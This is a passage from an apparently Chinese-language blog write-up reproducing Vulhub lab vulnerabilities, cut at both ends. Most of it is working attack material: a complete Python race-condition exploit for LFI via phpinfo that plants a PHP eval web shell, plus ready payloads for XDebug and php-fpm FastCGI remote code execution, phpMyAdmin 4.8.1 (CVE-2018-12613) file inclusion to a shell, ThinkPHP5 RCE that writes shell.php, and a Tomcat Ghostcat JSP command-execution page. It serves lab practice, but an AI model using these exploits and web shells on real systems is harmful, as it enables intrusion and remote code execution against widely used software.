file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="shellæ–‡ä»¶æˆåŠŸå†™å…¥"></p><p>æœ€åå³å¯åœ¨lfié¡µé¢è¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(&#96;ls&#96;);</span><br></pre></td></tr></table></figure><h2 id="XDebug-rce"><a href="#XDebug-rce" class="headerlink" title="XDebug rce"></a>XDebug rce</h2><p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®<code>remote_connect_back = 1</code><br>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>,ç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚<br>(ç±»ä¼¼äºä¹‹å‰çš„java jdwp,éƒ½æ˜¯ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼ŒåŒæ—¶ç›‘å¬äº†æŒ‡å®šç«¯å£ï¼Œè®©æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œ)<br>åœ¨æ¼æ´ç¯å¢ƒphpinfoä¸­å¯ä»¥çœ‹åˆ°xdebugçš„é…ç½®<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xdebug.ini"><br>è¿›è€Œæ‰¾åˆ°xdebugå¼€å¯<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½¿ç”¨è„šæœ¬ï¼Œæ³¨æ„éœ€è¦python3,åŒæ—¶è¦è¿è¡Œåœ¨æœ‰å…¬ç½‘ipçš„æœºå™¨ä¸Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http:&#x2F;&#x2F;ip:port&#x2F;index.php -c &#39;system(&#39;id&#39;);&#39;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="id"><br>å› ä¸ºè„šæœ¬å®é™…ä¸Šå®ç°çš„æ˜¯ç›‘å¬æœ¬åœ°9000ç«¯å£å¹¶ç­‰å¾…xdebugçš„è¿æ¥ã€‚å› æ­¤è¦ä¹ˆå¤„äºåŒä¸€å†…ç½‘ï¼Œè¦ä¹ˆè‡ªå·±æœ‰å…¬ç½‘ip.</p><h2 id="php-fpm-Fastcgi"><a href="#php-fpm-Fastcgi" class="headerlink" title="php-fpm Fastcgi"></a>php-fpm Fastcgi</h2><p>å…·ä½“ä½¿ç”¨åœ¨ä¹‹å‰çš„NCTF2019 phar matches everything ä¸­å·²ç»ç”¨è¿‡äº†ã€‚<br>ç”±äºPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡<br>è€Œfpmä¸­æœ‰ä¸€ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡å‚æ•°ï¼Œ<code>SCRIPT_FILENAME</code>ã€‚åªè¦å®ƒæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥æ‰§è¡Œphpæ–‡ä»¶ã€‚<br>å·²çŸ¥åŸç†åï¼Œåé¢å®ç°å…¶å®å°±ä¸éš¾äº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åè®®æ‰§è¡Œä»»æ„æ–‡ä»¶ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦æ‰§è¡Œä¸€ä¸ª<code>auto_prepend_fileä¸ºphp://input</code>å¹¶å¼€å¯<code>allow_url_include = On</code>ã€‚å®ƒåœ¨æ‰§è¡Œä»»æ„phpæ–‡ä»¶æ—¶éƒ½ä¼šæŠŠæˆ‘ä»¬postçš„å†…å®¹å¸¦è¿›å»ã€‚è¿›è€Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py ip /usr/local/lib/php/PEAR.php  -p <span class="number">9000</span> -c <span class="string">'&lt;?php echo `id`;exit();?&gt;'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="id"></p><h2 id="phpmyadmin-4-8-1-è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#phpmyadmin-4-8-1-è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"></a>phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>CVE-2018-12613ã€‚ä¹‹å‰æ›¾ç»åœ¨å¹¿å¤–çš„æ¯”èµ›åšè¿‡ã€‚åº”è¯¥è¯´æœ‰è®¸å¤šç§getshellæ–¹å¼ï¼Œåªä¸è¿‡å„æœ‰åƒç§‹å§ã€‚<br>ä¸»è¦æ¼æ´å‡ºåœ¨db_sql.php,ç”±äºé‡Œé¢ä¸€ä¸ªurlencodeå‡½æ•°çš„ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡äºŒæ¬¡ç¼–ç ç»•è¿‡å¹¶æ–‡ä»¶åŒ…å«ã€‚<br><code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br>è¿›ä¸€æ­¥å¯ä»¥getshell<br>ç›´æ¥æ‰§è¡Œsqlè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;&lt;?&#x3D;phpinfo();?&gt;&#96;;</span><br></pre></td></tr></table></figure><p>è®¿é—®è‡ªå·±çš„sessionç¼“å­˜æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_ce21bdd74738d8aaff45c82288addcb7</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="phpinfo"><br>æ‰€ä»¥å½“ç„¶å¯ä»¥æ‰§è¡Œsqlè¯­å¥<code>select &#39;&lt;?php @eval($_GET[&quot;byc&quot;]);?&gt;&#39;</code><br>å†™å…¥ä¸€å¥è¯å¹¶åŒ…å«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_43a49651429f0e100e0d55c016f338b5&amp;byc&#x3D;system(%27ls%27);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="getshell"><br>è²Œä¼¼ä¹‹å‰å¬è¯´è¿™ä¸ªç‰ˆæœ¬åªèƒ½ç”¨getçš„ä¸€å¥è¯ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™getçš„ä¸€å¥è¯å°±å¥½ã€‚</p><h1 id="ThinkPHP-RCE"><a href="#ThinkPHP-RCE" class="headerlink" title="ThinkPHP RCE"></a>ThinkPHP RCE</h1><h2 id="ThinkPHP5-5-0-22-5-1-29"><a href="#ThinkPHP5-5-0-22-5-1-29" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29"></a>ThinkPHP5 5.0.22/5.1.29</h2><p>å¤§è‡´çœ‹äº†ä¸‹ï¼Œè²Œä¼¼æ˜¯å› ä¸ºå‘½åç©ºé—´çš„ç¬¦å·ä½¿ç”¨å¯¼è‡´æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;-1</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥rce<br><code>&amp;vars[0]=system&amp;vars[1][]=ls</code><br>ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªshell.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;&lt;%3fphp+%40eval(%24_GET%5b%27byc%27%5d)%3b%3f&gt;</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-5-0-23"><a href="#ThinkPHP5-5-0-23" class="headerlink" title="ThinkPHP5 5.0.23"></a>ThinkPHP5 5.0.23</h2><p>ä¹Ÿæ˜¯æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami</span><br></pre></td></tr></table></figure><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="Ghostcat-CVE-2020-1938"><a href="#Ghostcat-CVE-2020-1938" class="headerlink" title="Ghostcat CVE-2020-1938"></a>Ghostcat CVE-2020-1938</h2><p>å¹½çµçŒ«ã€‚è¿™é‡Œçš„ç¯å¢ƒåªæä¾›äº†æ–‡ä»¶è¯»å–.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://vpsip/ <span class="number">8009</span> /WEB-INF/web.xml read</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æƒ³è¦è¿›è¡ŒRCEè¿˜éœ€è¦ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚<br>è¿™é‡Œç›´æ¥è¿›å…¥å®¹å™¨å¢åŠ ä¸€ä¸ªexp.jsp<br><code>docker exec -it å®¹å™¨id /bin/bash</code><br>æ²¡æœ‰vim.ç”¨curlææ¥ä¸€ä¸ªexp.jspåˆ°/WEB-INFä¸‹</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls /"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;vpsip&#x2F; 8009 &#x2F;WEB-INF&#x2F;exp.jsp eval</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å°è¯•äº†ä¸‹å¼¹shellçš„å‘½ä»¤å¤±è´¥äº†ã€‚ä½†æ˜¯é—®é¢˜æ‰¾ä¸å‡ºæ¥ã€‚æœ€å¥½åœ¨æ¯”èµ›ä¸­ä¸è¦èŠ±æ—¶é—´æ‰§ç€äºå¼¹shellã€‚å¯èƒ½ä¼šæœ‰å¤§é—®é¢˜ã€‚</p><p>è¡¥ï¼šç»éƒå¸ˆå‚…æŒ‡ç‚¹æ˜ç™½äº†æ˜¯jspçš„é—®é¢˜ã€‚å…·ä½“åŸå› ä¹‹åè§£é‡Šï¼Œç®€è¦è¯´ä¸»è¦æ˜¯javaå¼¹shellæ—¶ä½¿ç”¨å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ•°ç»„çš„åŒºåˆ«ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span 